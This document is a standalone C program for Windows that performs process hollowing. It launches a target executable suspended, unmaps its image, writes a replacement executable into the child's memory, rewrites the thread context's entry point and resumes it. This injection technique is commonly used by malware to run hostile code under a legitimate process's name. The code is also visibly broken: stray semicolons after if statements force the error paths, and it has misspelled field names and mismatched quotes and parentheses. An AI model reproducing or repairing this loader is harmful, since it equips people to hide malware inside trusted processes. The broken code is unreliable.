#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#pragma comment (lib,"ntdll.lib")

extern C NTSTATUS NTAPI NtTerminateProcess(HANDLE,NTSTATUS);
extern C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
extern C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
extern C NTSTATUS NTAPI NtGetContextThread(HANDLE,PCONTEXT);
extern C NTSTATUS NTAPI NtSetContextThread(HANDLE,PCONTEXT);
extern C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE,PVOID);
extern C NTSTATUS NTAPI NtResumeThread(HANDLE,PULONG);


int main(int argc,char* argv[])
{
  PIMAGE_DOS_HEADER pIDH;
  PIMAGE_NT_HEADERS pINH;
  PIMAGE_SECTION_HEADER pISH;
  PVOID image,mem,base;
  DWORD i,read,nSizeOfFile;
  HANDLE hFile;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  CONTEXT ctx;
  ctx.ContextFlags=CONTEXT_FULL;
  memset(&si,0,sizeof(si));
  memset(&pi,0,sizeof(pi));
  if(argc!=3)
  {
    printf("\nUsage:[Target executable][Replacement executable]"\n");
    return 1;
  }
  printf("\nRunning target executable.\n");
  if(!CreateProcess(NULL,argv[1],NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi));
  {
    printf("\nError:unable to run target executable.Createprocess failed with error %d\n",GetLastError());
    return 1;
  }
  printf("\nProcess created in suspended state.\n");
  printf("\nOpening the replacement executable.\n");
  hFile=CreateFile(argv[2], GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
  if(hFile==INVALID_HANDLE_VALUE)
  {
    printf("\nError:unable to open replacement executable.CreateFile failed with error%d\n",GetLastError());
    NtTerminateProcess(pi.hProcess,1);
    return 1;
  }
  nSizeOfFile=GetFileSize(hFile,NULL);
  image=VirtualAlloc(NULL,nSizeOfFile,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
  if(! ReadFile(hFile,image,nSizeOfFile,&read,NULL));
  {
    printf("\nError:Unable to read the replacement executable.ReadFile failed with error %d\n",GetLastError());
    NtTerminateProcess(pi.hProcess,1);
    return 1;
  }
  NtClose(hFile);
  pIDH=(PIMAGE_DOS_HEADER)image;
  if(pIDH->e_magic!=IMAGE_DOS_SIGNATURE)
  {
    printf("\nError:Invalid executable format.\n");
    NtTerminateProcess(pi.hProcess,1);
    return 1;
  }
pINH=(PIMAGE_NT_HEADERS)((LPBYTE)image+pIDH->e_ifanew);
NtGetContextThread(pi.hThread,&ctx);
NtReadVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&base,sizeof(PVOID),NULL);
if((DWORD)base==pINH->OptionalHeader.ImageBase)
{
  printf("\nUnmapping original executable from child process.Adress:%#0x\n", base);
  NtUnmapViewOfSection(pi.hProcess,base);
}
printf("\nAllocating memory in child process.\n");
mem=VirtualAllocEx(pi.hProcess,(PVOID)pINH->OptionalHeader.ImageBase,pINH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
if(!mem)
{
  printf("\nError:Unable to allocate memory in child process.VirtualAllocEx failed.with error %d\n",GetLastError());
  NtTerminateProcess(pi.hProcess,1);
  return 1;
}
printf("\nMemory allocated.Address:%#x\n",mem);
printf("\nWriting exe image into child process.\n");
for(i=0;i<pINH->FileHeader.NumberOfSections;i++)
{
  pISH=(PIMAGE_SECTION_HEADER)(LPBYTE)image+pIDH->e_ifanew+sizeof(IMAGE_NT_HEADERS)+(i*sizeof(IMAGE_SECTION_HEADER)));
  NtWriteVirtualMemory(pi.hProcess,(PVOID)((LPBYTE)mem+pISH->VirtualAddress),(PVOID)((LPBYTE)image+pISH->PointerToRawData),pISH->SizeOfRawData,NULL);
}
ctx.Eax=(DWORD)((LPBYTE)mem+pINH->OptionalHeader.AdressofEntryPoint);
printf("\nNew entry point:%#x\n",ctx.Eax);
NtWriteVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&pINH->OptionalHeader.ImageBase,sizeof(PVOID),NULL);
printf("\nSetting the context of the child process's primary thread.\n");
NtSetContextThread(pi.hThread,&ctx);
NtResumeThread(pi.hThread,NULL);
NtWaitForSingleObject(pi.hProcess,FALSE,NULL);
NtClose(pi.hThread);
NtClose(pi.hProcess);
VirtualFree(image,0,MEM_RELEASE);
return 0;
}
